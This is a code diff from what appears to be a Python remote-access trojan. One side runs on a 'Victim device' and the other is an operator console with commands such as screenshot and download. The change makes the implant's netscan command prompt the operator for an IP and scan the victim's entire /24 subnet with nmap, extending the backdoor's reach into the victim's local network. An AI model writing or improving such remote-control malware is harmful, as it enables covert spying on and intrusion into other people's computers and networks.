@@ -79,8 +79,9 @@ try:
                     except:
                           s.send('[!] File Not Found ..')
 		elif cmd[0:7] == 'netscan' and go==1:
+			s.send('get the ip')
 			ip=s.recv(1024)
-			nmap(ip)
+			nmap(ip+'/24')
 		elif 'print' in cmd:
 			print(cmd[5:])
                 elif cmd == 'download':
@@ -230,7 +231,10 @@ Simple Commands :
 	screenshot  : Take screenshot from Victim device
 """)
 		     		elif ha[0:8] == 'netscan':
+					ip=raw_input('\nEX : 192.168.1.1 \n[!] IP : ')
 					c.send("netscan")
+					if c.recv(1024) == 'get the ip':
+						c.send(ip.encode('utf-8'))
 					clinet_dict = []
 					sleep(1)
 					print("\n* IPs *\n-------")
